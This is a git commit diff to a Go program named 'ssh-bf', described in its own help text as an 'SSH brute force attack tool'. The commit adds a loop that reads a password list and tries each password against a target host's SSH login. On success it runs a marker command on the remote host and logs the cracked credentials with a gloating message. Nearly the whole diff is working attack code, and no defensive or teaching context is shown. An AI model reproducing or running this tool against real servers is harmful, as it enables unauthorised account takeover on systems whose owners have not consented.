9e487d2de730713da23f5a03da688f1d9aa106f8
nicojmn <nicolasjeanmenne@gmail.com>
2025-04-30 17:08:16 +0200

    [SSH/attack] : bf script working

--- src/attacks/ssh-bf/ssh.go
+++ src/attacks/ssh-bf/ssh.go
@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bufio"
+	"errors"
 	"fmt"
 	"os"
 
@@ -11,11 +13,14 @@ import (
 	"github.com/rs/zerolog/log"
 )
 
+var logger zerolog.Logger
+
+func successLogger(host string, port int, username string, password string) {
+	logger.Info().Str("host", host).Int("port", port).Str("username", username).Str("password", password).
+		Msg("\x1b[32m ---= Brute force successful 😈 ! =---\x1b[0m")
+}
+
 func BruteForce(host string, port int, username string, password string) bool {
-	if host == "" || port == 0 || username == "" || password == "" {
-		log.Error().Msg("Invalid parameters provided")
-		return false
-	}
 
 	config := &ssh.ClientConfig{
 		User: username,
@@ -29,33 +34,60 @@ func BruteForce(host string, port int, username string, password string) bool {
 
 	client, err := ssh.Dial("tcp", addr, config)
 	if err != nil {
-		log.Error().Err(err).Msg("Failed to connect to SSH server")
+		logger.Error().Err(err).Msg("Failed to connect to SSH server")
 		return false
 	}
 	defer client.Close()
 
 	session, err := client.NewSession()
 	if err != nil {
-		log.Error().Err(err).Msg("Failed to create SSH session")
+		logger.Error().Err(err).Msg("Failed to create SSH session")
 		return false
 	}
 	defer session.Close()
 
 	err = session.Run("touch /tmp/ssh-bf-success")
 	if err != nil {
-		log.Error().Err(err).Msg("Failed to run command on SSH server")
+		logger.Error().Err(err).Msg("Failed to run command on SSH server")
 		return false
 	}
 
-	log.Info().Msg("Brute force successful")
 	return true
 }
 
-func main() {
+func BruteForceList(host string, port int, username string, pass_list string) (string, error) {
 
+	file, err := os.Open(pass_list)
+	if err != nil {
+		return "", err
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+
+	for scanner.Scan() {
+		logger.Debug().Msg("Reading password from file")
+		password := scanner.Text()
+
+		if BruteForce(host, port, username, password) {
+			return password, nil
+		}
+
+		logger.Warn().Str("host", host).Int("port", port).Str("username", username).Str("password", password).Msg("Brute force failed")
+	}
+
+	if err := scanner.Err(); err != nil {
+		logger.Error().Err(err).Msg("Failed to read password list file")
+	}
+
+	return "", errors.New("brute force failed")
+}
+
+func main() {
 	// logger setup
 	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
-	logger := log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()
+	zerolog.SetGlobalLevel(zerolog.InfoLevel)
+	logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()
 
 	// argument parser setup
 	parser := argparse.NewParser("ssh-bf", "SSH brute force attack tool")
@@ -70,27 +102,61 @@ func main() {
 		Help:     "Target port",
 	})
 
-	username := parser.String("", "username", &argparse.Options{
+	username := parser.String("u", "username", &argparse.Options{
 		Required: true,
 		Help:     "Account username to brute force",
 	})
 
 	password := parser.String("", "password", &argparse.Options{
-		Required: true,
-		Help:     "password to brute force",
+		Required: false,
+		Help:     "Password to brute force, mutually exclusive with password list, only one of them should be used",
 	})
 
-	err := parser.Parse(os.Args)
-	if err != nil {
+	pass_list := parser.String("l", "password-list", &argparse.Options{
+		Required: false,
+		Help:     "Password list, in a text fromat, to use for brute force, mutually exclusive with password, only one of them should be used",
+	})
+
+	debug := parser.Flag("d", "debug", &argparse.Options{
+		Required: false,
+		Help:     "Enable debug mode",
+		Default:  false,
+	})
+
+	// parse arguments
+
+	if err := parser.Parse(os.Args); err != nil {
 		logger.Fatal().Err(err).Msg("Failed to parse arguments")
 	}
 
+	if *host == "" || *port <= 0 || *port >= 65535 || *username == "" {
+		logger.Fatal().Msg("Invalid arguments")
+	}
+
+	if *debug {
+		zerolog.SetGlobalLevel(zerolog.DebugLevel)
+		logger.Debug().Msg("Debug mode enabled")
+	}
+
 	// try to brute force
-	if !BruteForce(*host, *port, *username, *password) {
-		logger.Warn().Str("host", *host).Int("port", *port).Str("username", *username).Str("password", *password).Msg("Brute force failed")
+	if *pass_list != "" {
+		if *password != "" {
+			logger.Fatal().Msg("Only one of password or password list argument should be used")
+		}
+
+		logger.Debug().Str("host", *host).Int("port", *port).Str("username", *username).Str("password_list", *pass_list).Msg("Trying password list")
+
+		password, err := BruteForceList(*host, *port, *username, *pass_list)
+		if err != nil {
+			logger.Fatal().Err(err).Msg("Brute force failed")
+		}
+		successLogger(*host, *port, *username, password)
+
 	} else {
-		logger.Info().Str("host", *host).Int("port", *port).Str("username", *username).Str("password", *password).Msg("Brute force successful")
+		if !BruteForce(*host, *port, *username, *password) {
+			logger.Warn().Str("host", *host).Int("port", *port).Str("username", *username).Str("password", *password).Msg("Brute force failed")
+		} else {
+			successLogger(*host, *port, *username, *password)
+		}
 	}
 }
-
-
